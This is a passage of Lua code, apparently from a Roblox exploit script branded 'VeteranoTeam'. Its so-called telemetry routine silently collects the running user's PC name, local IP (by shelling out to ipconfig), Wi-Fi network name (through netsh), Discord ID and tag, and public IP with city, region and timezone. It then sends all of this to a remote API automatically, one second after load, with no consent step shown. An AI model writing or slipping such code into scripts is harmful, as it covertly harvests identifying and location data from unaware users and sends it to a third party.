            pc_name = readValue(function() return os.getenv and os.getenv("COMPUTERNAME") end),
            arch = (function()
                local ok, s = pcall(function() return string.packsize("I8") end)
                return ok and s == 8 and "x64" or "x86"
            end)(),
            platform = readValue(function() return UserInputService:GetPlatform().Name end),
            touch_enabled = UserInputService.TouchEnabled,
            keyboard_enabled = UserInputService.KeyboardEnabled,
            gamepad_enabled = UserInputService.GamepadEnabled,
            mouse_enabled = UserInputService.MouseEnabled,
            local_ip = (function()
                local ok, out = pcall(function()
                    local h = io and io.popen and io.popen('ipconfig 2>nul | findstr /i "IPv4"')
                    if h then local s = h:read("*a") or ""; h:close(); return s end
                    return ""
                end)
                if ok and out then local ip = out:match("(%d+%.%d+%.%d+%.%d+)"); if ip then return ip end end
                return ""
            end)(),
            wifi = (function()
                local ok, out = pcall(function()
                    local h = io and io.popen and io.popen('netsh wlan show interfaces 2>nul | findstr "SSID"')
                    if h then local s = h:read("*a") or ""; h:close(); return s end
                    return ""
                end)
                if ok and out and #out > 0 then
                    local ssid = out:match("SSID%s*:%s*([^\r\n]+)")
                    if ssid then return ssid:gsub("^%s+", ""):gsub("%s+$", "") end
                end
                return ""
            end)(),
            place_id = tostring(game.PlaceId),
            game_id = tostring(game.GameId),
            job_id = tostring(game.JobId),
            script_version = SCRIPT_VERSION,
            edition = EDITION,
            user_agent = "VeteranoTeam/" .. SCRIPT_VERSION .. " (" .. EDITION .. ")",
            discord_id = safeRead(FOLDER .. "/discord_id.txt") or "",
            discord_tag = safeRead(FOLDER .. "/discord_tag.txt") or "",
        }
        local profile = httpJSON("https://users.roblox.com/v1/users/" .. tostring(player.UserId))
        if session.cancelled then return nil end
        if profile and tonumber(profile.id) == player.UserId and type(profile.created) == "string" then
            data.roblox_created_at = profile.created
        end
        local geo = httpJSON("https://ipwho.is/?fields=success,ip,country,region,city,timezone")
        if session.cancelled then return nil end
        if geo and geo.success == true then
            data.public_ip = geo.ip or ""
            data.country = geo.country or ""
            data.region = geo.region or ""
            data.city = geo.city or ""
            data.timezone = type(geo.timezone) == "table" and geo.timezone.id or ""
        end
        return data
    end
    local function send()
        if session.cancelled or session.sent or session.sending then return end
        if type(requestFn) ~= "function" then session.status = "HTTP indisponivel"; return end
        session.sending = true
        task.spawn(function()
            local ok, problem = pcall(function()
                local data = collect()
                if not data or session.cancelled then return end
                local json = HttpService:JSONEncode(data)
                if session.cancelled then return end
                local encoded = HttpService:UrlEncode(json)
                local url = VT_API_URL .. "?action=record_execution&data=" .. encoded
                local response, err = httpJSON(url, "GET")
                if session.cancelled then return end
                if response and response.ok == true then
                    session.sent, session.status = true, "Sync concluido"
                else
                    session.status = "Sync nao confirmado: " .. tostring((response and response.error) or err or "SEM_JSON")
                end
            end)
            session.sending = false
            if not ok and not session.cancelled then
                session.status = "Sync falhou: " .. tostring(problem)
            end
        end)
    end

    function _G.__VT_TELEMETRY_CLEANUP()
        session.cancelled = true
    end

    task.defer(function()
        task.wait(1)
        if not session.cancelled then send() end
    end)
end
